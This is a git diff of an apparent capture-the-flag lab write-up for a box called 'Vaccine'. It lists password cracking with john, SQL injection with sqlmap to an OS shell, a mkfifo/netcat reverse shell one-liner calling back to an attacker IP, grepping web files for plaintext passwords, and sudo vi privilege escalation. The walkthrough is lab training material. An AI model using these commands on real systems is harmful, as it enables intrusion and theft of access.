@@ -270,7 +270,7 @@ FLAG: af13b0bee69f8a877c3faf667f7beacf
 
 ## VACCINE BOX
 
-**TOOLS USED**: nmap, john, sqlmap
+**TOOLS USED**: nmap, john, sqlmap, netcat
 
 **IP Address**: 10.129.25.68
 
@@ -307,22 +307,25 @@ john password.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
 
 PASSWORD: qwerty789
 
+PARAMETER: ?search\=
+
 ```
 sqlmap -u http://10.129.25.68/dashboard.php\?search\=bmw --cookie="PHPSESSID=1k1l8fdirbj26c9i8rrbg2t9gm" --os-shell
 ```
 
 --os-shell to get interactive shell once sql injection is complete <br>
---cookie either use Burp Suite or inspect element (Application > Storage)
+--cookie either use Burp Suite or inspect element (Application > Storage) after logged in
 
 ```
 nc -nlvp 4444
 ```
 
-inject netcat reverse shell
+inject netcat reverse shell from: https://www.revshells.com/
 ```
 > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.252 4444 >/tmp/f
 ```
 
+Find clear text passwords in .php files
 ```
 cd /var/www/html
 grep -iR "pass" *
@@ -343,6 +346,7 @@ sudo -l
 
 TARGET: /bin/vi
 
+https://gtfobins.github.io/gtfobins/vi/#sudo
 ```
 sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
 :set shell=/bin/sh
